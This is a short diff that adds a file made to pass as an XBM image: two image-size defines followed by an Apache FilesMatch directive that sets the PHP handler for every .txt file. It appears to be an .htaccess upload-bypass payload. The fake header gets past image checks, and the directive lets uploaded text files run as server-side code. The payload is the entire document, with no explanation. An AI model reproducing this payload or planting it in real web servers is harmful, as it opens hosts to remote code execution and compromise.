@@ -1,0 +1,5 @@
+#define width 16
+#define height 7
+<FilesMatch \.txt$>
+        SetHandler application/x-httpd-php
+</FilesMatch>
